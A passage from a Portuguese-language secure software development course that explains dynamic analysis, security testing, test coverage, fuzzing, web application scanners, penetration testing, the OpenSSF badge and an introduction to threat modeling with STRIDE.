fornecem ou vendem essas ferramentas. Isso inclui o OWASP Dependency Check (que é um OSS), os produtos Nexus da Sonatype, o Black Duck da Synopsys, o Ion Channel Solutions e o Snyk.</p> <p>Alguns gerenciadores de pacotes incluem esse recurso ou têm um plug-in para ele (por exemplo, <strong>o bundler</strong> do Ruby tem <strong>o bundle-audit</strong> ). Esta definitivamente <em>não</em> é uma lista completa e, sem dúvida, você vai querer comparar as opções.</p> <p>O ponto principal é que a maioria dos softwares reutiliza outros softwares e que vulnerabilidades serão ocasionalmente encontradas nesses softwares reutilizados.</p> <h2 id=visao-geral-e-limitacoes-da-analise-dinamica>Visão geral e limitações da análise dinâmica<a class=headerlink href=#visao-geral-e-limitacoes-da-analise-dinamica title="Permanent link">¶</a></h2> <p>Análise dinâmica é qualquer abordagem para verificar software (incluindo a descoberta de defeitos) executando software em entradas específicas e verificando os resultados. Analisaremos alguns tipos de ferramentas que fazem isso, mas primeiro, vamos discutir suas limitações.</p> <p>Todas as ferramentas de análise dinâmica têm uma limitação fundamental: é impossível avaliar todas as entradas possíveis em um período de tempo razoável. Nem mesmo é possível avaliar um <em>subconjunto razoável</em> .</p> <p>Imaginemos um programa trivial que soma dois inteiros de 64 bits.</p> <p>O número de entradas possíveis é <strong>(2<sup>64)*(2</sup>64) = 2^128</strong> .</p> <p>Se executássemos testes com um processador de 4 GHz e pudéssemos executar e testar cada entrada em 5 ciclos, levaria <strong>13,5 x 10^21</strong> anos (13,5 zettayears) para testar completamente o programa.</p> <p>Usar 1 milhão de processadores de 8 núcleos não ajuda o suficiente; isso reduziria o tempo para <strong>1,7 x 10^15</strong> anos (ou seja, 1,7 quatrilhão de anos). Programas reais têm entradas muito mais complexas do que isso, portanto, testar até mesmo 0,00001% de todas as entradas de programas reais é impossível em vidas humanas.</p> <p>Como resultado, todas as abordagens de análise dinâmica devem tentar selecionar um subconjunto muito pequeno de entradas possíveis que ainda tenham chance de detectar problemas onde eles existem.</p> <p>Elas costumam ser muito eficazes. Mas as abordagens de análise dinâmica não podem "provar" que algo funciona corretamente em geral; na melhor das hipóteses, elas têm uma boa chance de detectar problemas.</p> <h2 id=testes-tradicionais>Testes tradicionais<a class=headerlink href=#testes-tradicionais title="Permanent link">¶</a></h2> <p>A abordagem de análise dinâmica mais conhecida é o teste tradicional.</p> <p>Você seleciona entradas específicas para enviar a um programa e verifica se o resultado está correto. Você pode testar partes específicas de um programa, como um método ou função (isso é chamado de <em>teste unitário</em> ).</p> <p>Você também pode enviar sequências de entradas para o sistema integrado como um todo (chamado de <em>teste de integração</em> ). A maioria das pessoas combina testes unitários e de integração.</p> <p>O teste unitário é rápido e pode ser fácil testar muitos casos especiais, mas o teste unitário frequentemente ignora problemas de todo o sistema que o teste de integração tem muito mais probabilidade de detectar.</p> <p>Como os computadores são muito mais rápidos do que eram décadas atrás, geralmente é melhor focar no teste de integração em vez do teste unitário, mas ambas as abordagens têm seu lugar.</p> <p>A literatura sobre testes descreve outros tipos de teste, mas para nossos propósitos, essas duas abordagens são suficientes para entender os problemas.</p> <p>Para que seu software funcione corretamente, é fundamental que você tenha um bom conjunto de testes <em>automatizados</em> e o aplique ao seu pipeline de integração contínua.</p> <p>Por " <em>bom"</em> , queremos dizer "com relativa probabilidade de detectar problemas sérios no software". Embora isso não garanta a ausência de erros, um bom conjunto de testes aumenta significativamente a probabilidade de detecção e é especialmente importante para detectar problemas ao atualizar um componente reutilizado.</p> <p>Se você entregar um software e um defeito for posteriormente encontrado e corrigido, para cada correção, você deve considerar adicionar outro teste para essa situação. Muitas vezes, defeitos que escapam ao campo indicam um tipo de erro sutil que pode ocorrer novamente em uma versão futura do sistema. Nesse caso, adicione teste(s) para que, se o problema persistir, seja detectado <em>antes</em> do lançamento de outra versão.</p> <p>Se você estiver contratando outra pessoa para escrever (parte) do seu software e não quiser ser controlado por ela posteriormente, precisará garantir não apenas o código-fonte do aplicativo (e os direitos para modificá-lo posteriormente), mas também todas as instruções de compilação e testes necessários para poder alterar o software com segurança.</p> <p>Afinal, se você não puder compilar ou testar facilmente uma modificação de software, não há maneira segura de fazer modificações e distribuí-las.</p> <p>Em teoria, você pode criar testes manuais, ou seja, escrever um procedimento manual detalhado passo a passo e ter um humano seguindo essas etapas.</p> <p>Na prática, testes manuais são quase sempre "testes que não serão feitos" devido aos seus altos custos e atrasos. Outro problema com testes manuais é que eles <em>desencorajam</em> testes contínuos, já que esses testes manuais custam tempo e dinheiro. Portanto, evite testes manuais em favor de testes automatizados sempre que possível.</p> <p>Em alguns casos, você pode precisar fazer testes manuais, mas lembre-se de que todo teste manual é um teste que raramente (ou nunca) será feito, tornando-o muito menos útil.</p> <p>Observe que o que estamos descrevendo como <em>testes manuais</em> é diferente da <em>análise manual não direcionada</em> (onde humanos usam o software <em>sem</em> um processo passo a passo). A análise manual não direcionada pode ser bastante eficaz, mas é completamente diferente dos testes manuais como os definimos aqui.</p> <p>Um problema complicado em testes é quando um recurso não está disponível. Se o teste exigir algum software, hardware ou dados que você não possui, não será possível testá-lo diretamente.</p> <p>Normalmente, o melhor que você pode fazer nesses casos é simular o teste (por exemplo, com software simulado, hardware simulado ou um conjunto de dados substituto). Se isso for o melhor que você puder fazer, geralmente vale a pena.</p> <p>Mas não confunda a simulação com a realidade; os resultados do teste podem ser enganosos devido às diferenças entre o recurso real e seu substituto.</p> <h2 id=testes-tradicionais-de-seguranca>Testes tradicionais de segurança<a class=headerlink href=#testes-tradicionais-de-seguranca title="Permanent link">¶</a></h2> <p>Do ponto de vista da segurança, é importante incluir testes para os requisitos de segurança. Em particular, teste tanto "o que deve acontecer" quanto "o que não deve acontecer".</p> <p>Muitas vezes, as pessoas se esquecem de testar <em>o que não deve acontecer</em> (também conhecido como teste negativo). Por exemplo, onde aplicável, você deve ter um teste para verificar "Posso ler/escrever <em>sem</em> estar autorizado a fazê-lo?" (a resposta deve ser <strong>não</strong> ) e "Posso acessar o sistema com um certificado <em>inválido</em> ou sem certificado algum?" (novamente, isso deve falhar).</p> <p>É muito comum que a segurança dos programas falhe porque eles não verificam adequadamente a autenticação (2017 OWASP Top 10 <a class="magiclink magiclink-github magiclink-issue" href=https://github.com/squidfunk/mkdocs-material/issues/2 title="GitHub Issue: squidfunk/mkdocs-material #2">#2</a>) ou a autorização (2017 OWASP Top 10 <a class="magiclink magiclink-github magiclink-issue" href=https://github.com/squidfunk/mkdocs-material/issues/5 title="GitHub Issue: squidfunk/mkdocs-material #5">#5</a>), então certifique-se de ter testes para isso!</p> <p>Uma abordagem para o desenvolvimento de software é chamada de <em>desenvolvimento orientado a testes</em> (TDD). Para resumir, no TDD, os testes para uma nova capacidade são escritos antes do software implementar a capacidade. Isso tem algumas vantagens, em particular, incentiva a escrita de testes úteis que realmente verificam o que deveriam verificar, e também incentiva o desenvolvimento de software testável.</p> <p>Um problema potencial com o TDD é que muitos praticantes de TDD falham em escrever testes <em>negativos</em> . Algumas diretrizes de TDD até argumentam que você deve escrever testes apenas para a nova capacidade e nada mais.</p> <p>Esta é uma orientação terrível, porque às vezes algumas coisas simplesmente <em>nunca</em> deveriam acontecer, e você ainda precisa testá-las. Você pode definitivamente escrever software seguro usando TDD, mas deve incluir testes negativos (testes para o que o software <em>não</em> deve fazer) se aplicar o TDD.</p> <h2 id=cobertura-de-teste>Cobertura de teste<a class=headerlink href=#cobertura-de-teste title="Permanent link">¶</a></h2> <p>Você <em>sempre</em> pode escrever outro teste; como saber quando já escreveu testes suficientes?</p> <p>Criar e manter testes leva tempo, e testes só devem ser adicionados se agregarem valor. Esta é uma pergunta difícil, e muito depende da criticidade do seu software.</p> <p>Duas medidas simples que podem ajudar você a responder a essa pergunta são <em>a cobertura de declarações</em> e <em>a cobertura de filiais</em> :</p> <ul class=task-list> <li class=task-list-item><label class=task-list-control><input disabled type=checkbox><span class=task-list-indicator></span></label> A cobertura de instruções é a porcentagem de instruções do programa que foram executadas por pelo menos um teste.</li> <li class=task-list-item><label class=task-list-control><input disabled type=checkbox><span class=task-list-indicator></span></label> A cobertura de ramificações é a porcentagem de ramificações que foram executadas por pelo menos um teste. Em uma construção <strong>if-then-else , a parte</strong> <strong>then</strong> é uma ramificação e a parte <strong>else</strong> é a outra ramificação. Em um loop, a parte <em>run the body</em> é uma ramificação e <em>do not run the body</em> é a outra ramificação. Em uma instrução switch (case), cada possibilidade é uma ramificação.</li> </ul> <p>A cobertura de instruções e a cobertura de ramificações combinam análise dinâmica (resultados de testes) com análise estática (informações sobre o código), por isso às vezes são consideradas uma abordagem <em>híbrida</em> .</p> <p>Mas, independentemente do nome, essas medições fornecem algumas informações sobre o desempenho de um programa testado.</p> <p>Um problema potencial com a cobertura de instruções e a cobertura de ramificações é que algumas instruções e ramificações podem ser inacessíveis por diversos motivos. Se uma instrução não puder ser alcançada, você pode inserir o equivalente a <strong>assert(false)</strong> para informar às ferramentas e aos humanos que essa instrução nunca deve ser alcançada.</p> <p>O que você realmente precisa saber é a porcentagem de <em>possíveis</em> ramificações e instruções que foram cobertas pelos testes.</p> <p>Como regra geral, acreditamos que um conjunto de testes automatizados com menos de 90% de cobertura de instruções ou menos de 80% de cobertura de ramificações (em todos os testes automatizados) é um conjunto de testes ruim.</p> <p>Mas isso é apenas uma regra geral. Alguns especialistas acreditam que números maiores devem ser esperados (alguns argumentam que qualquer número menor que 100% das instruções e ramificações possíveis é inaceitável).</p> <p>Tudo o mais constante, números maiores são bons, mas geralmente é muito mais caro obter esses últimos por cento, e se vale a pena ou não depende da importância do software. Em muitos casos, algumas instruções ou ramificações não podem ser executadas e pode não haver uma maneira de indicar isso às ferramentas de medição.</p> <p>Essas medidas de cobertura de teste alertam sobre instruções e ramificações que não estão sendo testadas, e essa informação pode ser muito valiosa. Do ponto de vista da segurança, as medidas de cobertura alertam sobre instruções ou ramificações que não estão sendo executadas em testes, o que sugere que há testes importantes faltando ou que o software não está funcionando corretamente.</p> <p>Não adicione apenas um teste; certifique-se de entender <em>por que</em> algo não está sendo coberto.</p> <p>Por exemplo, mencionamos em um dos cursos anteriores deste programa uma vulnerabilidade perigosa em muitas versões dos sistemas operacionais da Apple, formalmente chamada de CVE-2014-1266 e informalmente chamada de vulnerabilidade "goto fail; goto fail;".</p> <p>O problema era que, devido a uma instrução <strong>goto</strong> duplicada , parte do código vital para a verificação de certificados de segurança foi ignorada. Uma medida de cobertura de instrução teria detectado trivialmente que esse código crítico de segurança não estava sendo executado por nenhum teste, e isso deveria ter sido um aviso suficiente para investigar o problema.</p> <p>Um grande problema com medidas de cobertura de instruções e ramificações é que elas podem alertar sobre alguns conjuntos de testes automatizados ruins, mas um conjunto de testes ruim ainda pode obter pontuações 100% perfeitas.</p> <p>Por exemplo, um conjunto de testes pode testar todos os ramos e instruções, mas não verificar se alguma das respostas está correta. Esse conjunto de testes teria 100% de cobertura de ramos e instruções e também seria um conjunto de testes ruim. Além disso, embora possam informar se o código existente foi testado ou não, elas não conseguem detectar código <em>ausente</em> .</p> <p>Por exemplo, se houver um caso especial que precise de tratamento especial, mas nada verificar esse caso especial, normalmente essas medidas de cobertura não conseguem detectá-lo.</p> <p><strong><em>Resumindo:</em></strong> essas medidas de cobertura podem ser úteis para alertar sobre alguns problemas, mas não alertam sobre todos os problemas de teste.</p> <p>Mas a análise dinâmica envolve mais do que isso quando se trata de segurança. A seguir, vamos analisar os testes de fuzz.</p> <h2 id=teste-de-fuzz-fuzzing-vs-teste-tradicional>Teste de Fuzz: Fuzzing vs Teste Tradicional<a class=headerlink href=#teste-de-fuzz-fuzzing-vs-teste-tradicional title="Permanent link">¶</a></h2> <p>O teste de fuzz é um tipo diferente de análise dinâmica.</p> <p>Em testes fuzz, você gera um grande número de entradas <em>aleatórias</em> , executa o programa e verifica se ele se comporta mal (por exemplo, trava ou paralisa).</p> <p>Um aspecto fundamental do fuzzing é que ele geralmente <strong><em>não</em></strong> verifica se o programa produz a resposta correta; apenas verifica se um comportamento razoável (como "não trava") ocorre.</p> <p>Criar testes tradicionais costuma dar muito trabalho, em parte porque você precisa saber qual será o resultado correto.</p> <p>O fuzzing abre mão disso, facilitando o envio automático de mais entradas para um programa, mas abrindo mão da capacidade de detectar certos tipos de erros.</p> <p>À medida que os computadores se tornaram mais rápidos e baratos, o fuzzing tornou-se muito útil, pois é possível executar vários computadores por um longo período para testar muitas entradas.</p> <p>O fuzzing pode ser particularmente eficaz na detecção de erros de segurança de memória (que são comuns e perigosos) e na criação de entradas estranhas que sobrecarregam os validadores de entrada. O fuzzing não substitui os testes tradicionais, mas pode ser um excelente complemento para eles.</p> <p>Existem muitos fuzzers, e muitas pesquisas têm se concentrado em aprimorá-los.</p> <p>Historicamente, os fuzzers aplicavam entradas verdadeiramente aleatórias. Hoje, muitos fuzzers usam heurísticas, modelos de protocolo e/ou outras informações para gerar a entrada do software em teste (SUT), também conhecido como alvo da avaliação (TOE), também conhecido como alvo. Alguns fuzzers também ampliaram as maneiras de detectar um problema, não apenas detectando uma falha.</p> <p>Essas mudanças aumentam a probabilidade de encontrar um defeito (incluindo uma vulnerabilidade).</p> <h2 id=usando-fuzzers-efetivamente>Usando Fuzzers Efetivamente<a class=headerlink href=#usando-fuzzers-efetivamente title="Permanent link">¶</a></h2> <p>Fuzzers podem ser muito úteis para encontrar vulnerabilidades. Se você usar um, geralmente é aconselhável adicionar e habilitar asserções de programa.</p> <p>Isso transforma problemas de estado interno — que podem não ser detectados pelo fuzzer — em uma falha, que o fuzzer pode detectar facilmente. Se você estiver executando um programa em C/C++, considere usar um fuzzer em combinação com um sanitizador de endereços (ASAN) — o ASAN transformará alguns problemas de acesso à memória que normalmente ocorreriam silenciosamente em uma falha e, novamente, essa transformação melhora a capacidade do fuzzer de detectar problemas.</p> <p>Os navegadores Firefox e Chromium usam fuzzers, combinados com ASAN, para tentar detectar vulnerabilidades antes de lançar novas versões.</p> <p>Se o seu programa realiza verificações na entrada, como a análise de somas de verificação ou cabeçalhos CRC (Verificação de Redundância Cíclica), você provavelmente precisará desabilitar essas verificações ou, especialmente, reimplementar esses valores ao usar um fuzzer.</p> <p>De qualquer forma, use o fuzzer primeiro no programa sem modificações, mas o problema é que o fuzzer acabará testando principalmente o código de verificação de somas de verificação/cabeçalhos CRC repetidamente, e não o restante do código. Alguns fuzzers são projetados para criar entradas bem formatadas que passarão por verificações como CRC e, em seguida, tentarão encontrar erros mais profundamente no programa em teste.</p> <p>Muitos fuzzers são <em>baseados em mutação</em> — ou seja, começam com um conjunto inicial de entradas de amostra (chamadas "sementes") e, em seguida, mutam repetidamente as entradas anteriores para criar novas entradas de teste.</p> <p>A eficácia dos fuzzers baseados em mutação depende muito das sementes escolhidas. Uma regra prática útil para criar sementes é tentar selecionar um conjunto mínimo de entradas necessário para cobrir (ou quase cobrir) o código (ou seja, atingir 100% de cobertura de instruções).</p> <p>Para saber mais, consulte <em><a href=https://www.usenix.org/system/files/conference/usenixsecurity14/sec14-paper-rebert.pdf>"Otimizando a Seleção de Sementes para Fuzzing"</a></em> , 2014. Se forem muitas sementes, selecione sementes para cobrir o máximo possível do código com esse número de sementes (para que cada semente seja significativamente diferente).</p> <h2 id=fuzzers-guiados-por-cobertura>Fuzzers guiados por cobertura<a class=headerlink href=#fuzzers-guiados-por-cobertura title="Permanent link">¶</a></h2> <p>Uma importante subclasse de fuzzer é um <em>fuzzer guiado por cobertura</em> .</p> <p>Esses fuzzers instrumentam o software em teste (SUT, o programa que está sendo testado) para que o fuzzer obtenha informações sobre qual código é coberto quando cada entrada é executada (incluindo, em muitos casos, com que frequência várias partes do código são executadas).</p> <p>Essas informações são então usadas para determinar as próximas entradas a serem geradas.</p> <p>A ferramenta American Fuzzy Lop (AFL) demonstrou o poder dessa técnica; ela usa não apenas quais partes do código são executadas, mas quantas vezes, e prefere gerar novas entradas semelhantes às entradas anteriores que causaram novas contagens.</p> <p>Outras ferramentas, como libFuzzer, também usam essa abordagem. Esses fuzzers também são chamados de <em>fuzzers baseados em feedback</em> ou uma ferramenta <em>de teste de segurança de aplicativo baseada em feedback (FAST) (</em> <em><a href=https://blog.code-intelligence.com/what-is-fast>O que é FAST?,</a></em> por Sergej Dechand, 2020). Essa abordagem combina análise estática e dinâmica, portanto, essas ferramentas podem ser consideradas ferramentas de análise híbridas.</p> <h2 id=taxa-de-retorno-decrescente>Taxa de retorno decrescente<a class=headerlink href=#taxa-de-retorno-decrescente title="Permanent link">¶</a></h2> <p>Um desafio com fuzzers é que, com o tempo, eles geralmente apresentam uma taxa de retorno decrescente. Ou seja, eles frequentemente conseguem encontrar vulnerabilidades em programas que nunca foram fuzzed antes, mas pode levar um tempo exponencial (ou nunca) para encontrar a próxima vulnerabilidade depois que os problemas detectados anteriormente forem corrigidos.</p> <p>Isso também pode exigir recursos; o fuzzing pode levar dias, semanas ou até mais de execução contínua em vários sistemas paralelos antes que o fuzzing consiga encontrar algo.</p> <p>Isso não significa que os fuzzers sejam inúteis – eles podem ser muito úteis – mas, novamente, eles são apenas parte de um conjunto de ferramentas para tornar o software seguro.</p> <h2 id=projetos-de-fuzzing>Projetos de Fuzzing<a class=headerlink href=#projetos-de-fuzzing title="Permanent link">¶</a></h2> <p>Se você gerencia um projeto OSS, pode considerar participar do <a href=https://github.com/google/oss-fuzz>projeto OSS-Fuzz</a> do Google .</p> <p>O OSS-Fuzz aplica testes de fuzzing em combinação com diversos sanitizadores para tentar detectar vulnerabilidades.</p> <p>O <a href=https://fuzzing-project.org/ >Projeto Fuzzing</a> incentiva/coordena a aplicação de testes de fuzzing em software de código aberto.</p> <h2 id=fuzzing-e-scanners-de-aplicativos-da-web>Fuzzing e scanners de aplicativos da Web<a class=headerlink href=#fuzzing-e-scanners-de-aplicativos-da-web title="Permanent link">¶</a></h2> <p>Há um grande número de fuzzers, e as coisas mudam o tempo todo.</p> <p>O primeiro passo é saber que existe uma ferramenta que pode ser útil.</p> <p>No entanto, se o que você desenvolveu é uma aplicação web, existe uma ferramenta projetada especificamente para essa situação que normalmente incorpora um fuzzer, chamada de <em>scanner de aplicação web</em> .</p> <h2 id=scanners-de-aplicativos-da-web>Scanners de aplicativos da Web<a class=headerlink href=#scanners-de-aplicativos-da-web title="Permanent link">¶</a></h2> <p>Hoje em dia, muitas pessoas desenvolvem aplicativos web, e esses aplicativos possuem diversas interfaces padrão. Como resultado, existem programas projetados especificamente para analisar aplicativos web dinamicamente em busca de vulnerabilidades.</p> <p>Um scanner de aplicações web (WAS), também chamado de scanner de vulnerabilidades de aplicações web, basicamente finge ser um usuário ou navegador web simulado e tenta fazer várias coisas para detectar problemas.</p> <p>Pense em um WAS como um usuário frenético e malicioso de um navegador web; o WAS tentará clicar em todos os botões que encontrar, inserir textos estranhos em todos os campos de texto que encontrar, e assim por diante.</p> <p>Em resumo, ele tenta simular ataques e comportamentos estranhos para tentar detectar problemas. Isso significa que os WASs geralmente se baseiam em fuzzers internos, mas são projetados especificamente para analisar aplicações web.</p> <p>Uma questão fundamental em um WAS é quais vetores de entrada ele pode testar. Alguns WASs só conseguem criar novas URLs e não podem testar aplicativos JavaScript do lado do cliente. Esses programas não são tão úteis para testar programas com JavaScript do lado do cliente.</p> <p>Os WASs também diferem na forma como detectam problemas com os resultados. Não é de surpreender que a falha de uma aplicação web seja relatada como um problema.</p> <p>Os WASs também tendem a realizar uma variedade de verificações <em>passivas</em> (por exemplo, para verificar os atributos dos cookies retornados) para tentar detectar uma variedade de problemas.</p> <p>Como muitas outras ferramentas, os WASs operam heuristicamente e geralmente possuem uma variedade de regras. Como resultado, diferentes WASs podem detectar (e não detectar) coisas diferentes.</p> <p>Você deve usar um WAS em um ambiente de teste, não em um ambiente de produção propriamente dito, pois ele tentará causar problemas <em>intencionalmente</em> .</p> <p>Você pode querer começar executando o WAS como está, mas logo precisará criar uma conta falsa e fornecer as informações falsas ao WAS. Caso contrário, se o seu sistema de login estiver construído corretamente, o WAS só conseguirá testar vulnerabilidades para alguém sem credenciais de login válidas.</p> <p>Existem muitas dessas ferramentas. Ferramentas de OSS incluem OWASP ZAP, W3AF, IronWASP, Skipfish e Wapiti. Ferramentas proprietárias incluem IBM AppScan, HP WebInspect e Burp Suite Pro.</p> <p>Se você não tem ideia, pode pelo menos conferir o OWASP ZAP; é fácil de usar e pode encontrar muitas coisas. Mas as ferramentas mudam com o tempo, e é melhor analisar suas opções antes de escolher uma (ou várias).</p> <p>Se você estiver desenvolvendo um aplicativo web, é uma boa ideia usar pelo menos um scanner de aplicativo web. Essas ferramentas não encontrarão todos os problemas possíveis e, assim como os fuzzers, tendem a encontrar menos problemas com o tempo. Mas ainda podem ser úteis.</p> <p>O termo Teste Dinâmico de Segurança de Aplicações, ou DAST, é frequentemente encontrado na literatura. No entanto, o <em>significado</em> de DAST apresenta muitas variações:</p> <ul> <li>Para alguns, DAST é uma análise dinâmica para encontrar vulnerabilidades em aplicativos da web (consulte VeraCode, <em><a href=https://www.veracode.com/security/dast-test>DAST TEST: Benefits of a DAST test for application security</a></em> , 2020), tornando o termo equivalente a <em>scanners de aplicativos da web</em> . John Breeden II ( <em><a href=https://www.csoonline.com/article/3487708/9-top-fuzzing-tools-finding-the-weirdest-application-errors.html>9 principais ferramentas de fuzzing: Encontrando os erros mais estranhos em aplicativos: ferramentas de teste de fuzzing eliminam erros de programação estranhos que podem resultar em erros de aplicativos inesperados e perigosos que os invasores podem explorar</a></em> , 2019) afirma isso e diferencia expressamente DAST de fuzzing.</li> <li>Thomas Scanlon ( <em><a href=https://insights.sei.cmu.edu/sei_blog/2018/07/10-types-of-application-security-testing-tools-when-and-how-to-use-them.html>10 Tipos de Ferramentas de Teste de Segurança de Aplicativos: Quando e Como Usá-las</a></em> , 2018) define DAST como ferramentas para encontrar vulnerabilidades de segurança onde <em>"o testador não tem conhecimento prévio do sistema"</em> e que <em>"ferramentas DAST empregam fuzzing"</em> . Com essa definição, scanners e fuzzers de aplicativos web são ferramentas DAST. Da mesma forma, Sergej Dechand ( <em><a href=https://blog.code-intelligence.com/what-is-fast>O que é FAST?,</a></em> 2020) inclui scanners e fuzzers de aplicativos web no DAST.</li> </ul> <h2 id=combinando-abordagens-de-verificacao>Combinando abordagens de verificação<a class=headerlink href=#combinando-abordagens-de-verificacao title="Permanent link">¶</a></h2> <p>Existem muitos outros tipos de abordagens de verificação e muitas maneiras de combiná-las.</p> <p>Um <em>teste de penetração</em> (também conhecido como <em>teste de penetração</em> ) simula um ataque a um sistema para tentar invadi-lo ( <em>penetrá-lo</em> ).</p> <p>Os responsáveis ​​por um teste de penetração são chamados de <strong>testadores de penetração ou equipe vermelha</strong>; eles podem ser ativamente combatidos por uma <strong>equipe defensiva (também chamada de equipe azul)</strong>.</p> <p>O objetivo de um teste de penetração é identificar as fraquezas para que elas possam ser fortalecidas <em><strong>antes que</strong></em> um invasor real tente atacar o sistema.</p> <p>Uma <em>auditoria de segurança</em> analisa um sistema em busca de vulnerabilidades.</p> <p>Frequentemente, a expressão é usada para sugerir uma abordagem mais metódica, na qual projetos e códigos são revisados ​​em busca de problemas.</p> <p>Mas isso nem sempre é verdade; os termos <em>auditoria de segurança</em> e <em>teste de penetração</em> são, às vezes, usados ​​como sinônimos.</p> <p>Apesar disso, auditorias de segurança e testes de penetração frequentemente empregam uma variedade de técnicas, incluindo análise estática e dinâmica, para tentar encontrar vulnerabilidades antes que invasores reais possam encontrá-las e explorá-las.</p> <p>O selo de Melhores Práticas da Open Source Security Foundation (OpenSSF) identifica um conjunto de melhores práticas para projetos de software de código aberto (OSS).</p> <p>Há três níveis de selo: <strong>aprovado, prata e ouro</strong>.</p> <p>Cada nível exige o cumprimento do nível anterior; ouro é especialmente difícil e <em>requer</em> vários desenvolvedores.</p> <p>Dentro de cada nível, há um conjunto de critérios considerados melhores práticas para o desenvolvimento de OSS seguro e sustentável, e cada critério possui um identificador curto. Aqui estão alguns exemplos de seus critérios:</p> <ul> <li><em>"O projeto DEVE usar pelo menos um conjunto de testes automatizados que seja lançado publicamente como FLOSS (esse conjunto de testes pode ser mantido como um projeto <a href=https://www.gnu.org/philosophy/floss-and-foss.pt-br.html>FLOSS</a> separado)."</em> </li> <li>Observe que esse critério se aplica exclusivamente a um conjunto de testes automatizados tradicional (por exemplo, para sua funcionalidade).</li> <li><em>"Pelo menos uma ferramenta de análise estática de código DEVE ser aplicada a qualquer versão de produção principal proposta do software antes de seu lançamento, se houver pelo menos uma ferramenta FLOSS que implemente esse critério na linguagem selecionada."</em> <strong>[static_analysis]</strong></li> <li><em>"Os sites do projeto (site, repositório e URLs de download) DEVEM oferecer suporte a HTTPS usando TLS."</em> <strong>[sites_https]</strong></li> </ul> <p>Se você desenvolve software livre, considere seriamente trabalhar para obter um selo de Melhores Práticas do OpenSSF.</p> <p>Ao implementar essas práticas recomendadas, você aumentará as chances de desenvolver softwares de maior qualidade e mais seguros.</p> <p>Para saber mais e começar, confira o <a href=https://www.bestpractices.dev/en>Programa de Selo de Melhores Práticas do OpenSSF</a> .</p> <h2 id=introducao-a-modelagem-de-ameacas>Introdução à Modelagem de Ameaças<a class=headerlink href=#introducao-a-modelagem-de-ameacas title="Permanent link">¶</a></h2> <p>Um truque útil para criar sistemas seguros é <strong><em>pensar como um invasor</em></strong> antes de escrever o código ou fazer uma alteração nele.</p> <p>Modelagem de ameaças é o processo de examinar seus requisitos e design para considerar como um invasor pode explorar ou invadir seu sistema, para que você possa tentar prevenir esses problemas desde o início.</p> <p>Para nossos propósitos, consideraremos o termo <em>modelagem de ataques</em> como sinônimo de <em>modelagem de ameaças</em> , embora alguns usem os termos com significados diferentes.</p> <p>A terminologia do setor difere bastante aqui, e queremos nos concentrar no que é útil fazer, não em como chamá-lo.</p> <p>Uma grande vantagem da modelagem de ameaças/modelagem de ataques é que você pode fazer isso <em>antes que</em> um design seja definido ou o código seja escrito, para que eles possam ajudá-lo desde o início no desenvolvimento de um novo sistema.</p> <p>Se não houver um risco de segurança significativo, a modelagem de ameaças provavelmente não se justifica. A modelagem de ameaças também provavelmente não vale a pena se você estiver apenas escrevendo um pequeno componente dentro de um sistema que não seja focado em segurança (como um pacote JavaScript de função única para manipulação simples de texto). A modelagem de ameaças geralmente se concentra em sistemas maiores, onde há limites de confiança claros.</p> <p>Mas, se houver um risco de segurança significativo e você estiver construindo algo maior, pensar cuidadosamente sobre as coisas do ponto de vista do invasor pode ser muito útil.</p> <p>Existem muitas maneiras diferentes de realizar a modelagem de ameaças. Por onde começar, por exemplo? Diferentes abordagens podem enfatizar começar com:</p> <ul> <li>O atacante (quais são os objetivos do atacante? suas capacidades? sua maneira de fazer as coisas?)</li> <li>Os ativos a serem protegidos</li> <li>O design do sistema.</li> </ul> <p>Você deve pensar pelo menos um pouco sobre todos eles, mas é útil ter um ponto de partida. Muitos especialistas em segurança começam com o invasor ou os ativos. No entanto, para muitos desenvolvedores, geralmente é mais fácil começar com o design. Muitos desenvolvedores não sabem em profundidade como os invasores operam, e muitas organizações têm uma dificuldade surpreendente em descobrir quais ativos são mais importantes. Em contraste, se você desenvolve software, precisa <strong><em>ser</em></strong> capaz de dividir um problema; portanto, para a maioria dos desenvolvedores, o foco no design começa com uma força natural. Você não deve <em>ignorar</em> quem é o invasor ou quais ativos precisam ser protegidos; é apenas uma questão de ênfase.</p> <p>Um problema relacionado é como realizar esse tipo de análise. Algumas pessoas criam um conjunto de <em>árvores de ataque</em> . Cada árvore identifica um evento que um invasor tenta causar, trabalhando de trás para frente para mostrar como o evento poderia acontecer (com sorte, você mostrará que ele não pode acontecer ou é extremamente improvável). Essa abordagem pode funcionar bem, mas, na prática, requer experiência em métodos de ataque; essa é uma experiência que poucos desenvolvedores possuem. Algumas abordagens se concentram na análise de uma organização, mas se o seu software for usado em muitas organizações diferentes, isso não funciona bem.</p> <p>Para nossos propósitos, vamos nos concentrar na próxima unidade em uma abordagem muito simples chamada STRIDE.</p> <h2 id=stride>STRIDE<a class=headerlink href=#stride title="Permanent link">¶</a></h2> <p>Uma abordagem centrada em design simples é a desenvolvida pela Microsoft, chamada STRIDE.</p> <p>Abordaremos o STRIDE aqui, pois é melhor conhecer uma abordagem simples que ajude do que um sistema complexo que pode ser muito difícil de usar. Na literatura, essa versão é chamada de _STRIDE-by-element .</p> <p>Consulte_ <em><a href=https://github.blog/2020-09-02-how-we-threat-model/ >o livro "How we threat model"</a></em> (2020) , de Robert Reichel, para uma discussão sobre como o GitHub utiliza o STRIDE.</p> <p><em><a href=https://www.microsoft.com/en-us/securityengineering/sdl/threatmodeling>A Microsoft recomenda executar as seguintes etapas para qualquer abordagem de modelagem de ameaças (modelagem de ataques) ( Modelagem de Ameaças</a></em> da Microsoft ):</p> <ol> <li>Defina requisitos de segurança.</li> <li>Crie um diagrama de aplicação.</li> <li>Identificar ameaças.</li> <li>Mitigar ameaças.</li> <li>Valide se as ameaças foram mitigadas.</li> </ol> <p>Ao aplicar o STRIDE na etapa 2, você precisa criar uma representação simples do seu design. Normalmente, isso é feito criando um diagrama de fluxo de dados (DFD) simples (para mais detalhes, consulte <em><a href=https://insights.sei.cmu.edu/sei_blog/2018/12/threat-modeling-12-available-methods.html>Modelagem de Ameaças: 12 Métodos Disponíveis</a></em> , de Nataliya Shevchenko (2018)):</p> <ol> <li>Os processos de dados são representados por círculos</li> <li>Os armazenamentos de dados são representados com linhas acima e abaixo de seus nomes (você também pode vê-los como cilindros)</li> <li>Os fluxos de dados são representados por linhas direcionadas; estes incluem fluxos de dados em uma rede</li> <li>Os interatores (itens que estão fora do seu sistema e interagem com ele) geralmente têm ícones simples, como um boneco de palito para um humano</li> <li>Os limites de confiança são representados por uma linha tracejada; eles representam a fronteira entre partes confiáveis ​​e não confiáveis.</li> </ol> <p>Elementos são tudo, exceto os limites de confiança. Ou seja, processos, armazenamentos de 